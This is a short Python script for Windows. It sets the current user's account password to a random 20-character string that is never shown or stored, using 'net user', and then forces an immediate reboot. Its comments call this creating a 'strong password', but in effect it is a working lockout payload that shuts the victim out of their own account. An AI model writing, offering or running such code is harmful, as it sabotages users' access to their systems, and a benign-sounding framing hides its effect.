import os
import random

username=os.environ.get("USERNAME") # get username
alphabet=list("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              +"abcdefghijklmnopqrstuvwxyz"
              +"1234567890"
              +"!@#$%^&*()_+?><")

password="".join(random.choices(alphabet, k=20)) # create strong password

os.system(f"""net user "{username}" "{password}" """) #change user password

os.system("shutdown -r -t 00") # reboot system